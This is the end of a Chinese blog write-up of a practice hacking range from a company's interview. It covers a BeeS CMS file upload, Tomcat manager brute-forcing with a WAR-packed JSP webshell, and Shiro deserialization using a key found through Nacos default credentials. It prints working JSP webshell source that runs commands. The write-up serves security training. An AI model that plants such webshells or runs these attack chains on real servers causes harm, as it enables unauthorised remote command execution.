+<p><a class="link" href="https://blog.csdn.net/shw_yzh/article/details/142751435"  target="_blank" rel="noopener"
+    >BeeS CMS 靶场漏洞攻略_beescms漏洞-CSDN博客</a></p>
+<p>上传文件就行</p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114235046469.png"
+	width="1147"
+	height="249"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114235046469_hu_fb42718f8f1e5984.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114235046469_hu_61078f469a86a542.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114235046469"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="460"
+		data-flex-basis="1105px"
+	
+></p>
+<p>之后蚁剑连接就行</p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114235230372.png"
+	width="690"
+	height="141"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114235230372_hu_9b8e5514e9bb68e8.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114235230372_hu_5967de4f160c87fa.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114235230372"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="489"
+		data-flex-basis="1174px"
+	
+></p>
+<h2 id="web5">web5
+</h2><h3 id="考点tomcat后台爆破后台上传文件getshell">考点：tomcat后台爆破+后台上传文件getshell
+</h3><p>后台默认是manager/html</p>
+<p><a class="link" href="https://blog.csdn.net/x319427393/article/details/126210083"  target="_blank" rel="noopener"
+    >记一次暴力破解tomcat后台密码（附带python脚本）_tomcat后台登录字典-CSDN博客</a></p>
+<img src="image-20251115161524417.png" alt="image-20251115161524417" style="zoom:50%;" />
+<img src="image-20251115161923698.png" alt="image-20251115161923698" style="zoom:50%;" />
+<p>解码是：tomcat:qwe123</p>
+<p>然后上传webshell-cmd2.jsp(压缩为cmd2.zip后改成war后缀上传)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># cmd2.jsp
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    if(&#34;023&#34;.equals(request.getParameter(&#34;pwd&#34;))){
+</span></span><span class="line"><span class="cl">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&#34;i&#34;)).getInputStream();
+</span></span><span class="line"><span class="cl">        int a = -1;
+</span></span><span class="line"><span class="cl">        byte[] b = new byte[2048];
+</span></span><span class="line"><span class="cl">        out.print(&#34;&lt;pre&gt;&#34;);
+</span></span><span class="line"><span class="cl">        while((a=in.read(b))!=-1){
+</span></span><span class="line"><span class="cl">            out.println(new String(b));
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        out.print(&#34;&lt;/pre&gt;&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115163645079.png"
+	width="1773"
+	height="305"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115163645079_hu_dfc000abc2ca31dd.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115163645079_hu_9d4a078a584e4fe1.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251115163645079"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="581"
+		data-flex-basis="1395px"
+	
+></p>
+<p><a class="link" href="https://blog.csdn.net/weixin_41924764/article/details/108196725"  target="_blank" rel="noopener"
+    >tomcat后台多种姿势getshell_tomcat getshell-CSDN博客</a></p>
+<h2 id="web6">web6
+</h2><h3 id="考点liqunkit一把梭">考点：LiqunKit一把梭
+</h3><img src="image-20251115185932656.png" alt="image-20251115185932656" style="zoom:50%;" />
+<h2 id="web7-1">web7-1
+</h2><h3 id="考点shiro反序列化">考点：Shiro反序列化
+</h3><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114203136612.png"
+	width="529"
+	height="286"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114203136612_hu_f3f8a40585a456ee.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114203136612_hu_5a7ec8e0b7cc729d.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114203136612"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="184"
+		data-flex-basis="443px"
+	
+></p>
+<p>不过找不到密钥</p>
+<p>fscan扫一下，发现有nacos</p>
+<img src="image-20251115182958369.png" alt="image-20251115182958369" style="zoom:50%;" />
+<p>弱口令nacos/nacos登入，配置里面找到了key</p>
+<img src="image-20251115183154661.png" alt="image-20251115183154661" style="zoom:50%;" />
+<p>接下来就是打shrio反序列化就行</p>
+<img src="image-20251115183401480.png" alt="image-20251115183401480" style="zoom:50%;" />
+<p><a class="link" href="https://cl0v3.top/2025/04/18/%e6%9f%90%e5%85%ac%e5%8f%b8%e4%ba%8c%e9%9d%a2%e9%9d%b6%e5%9c%ba%e8%ae%b0%e5%bd%95/#Web5"  target="_blank" rel="noopener"
+    >某公司二面靶场记录 - sawtooth384的博客</a></p>
+<p><a class="link" href="https://xz.aliyun.com/news/16521"  target="_blank" rel="noopener"
+    >某科技公司二面WEB靶场详解-先知社区</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/delegation/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Delegation</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/spoofing/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">spoofing</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-initial/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-Initial</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-hospital/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-Hospital</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 luokaihong
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
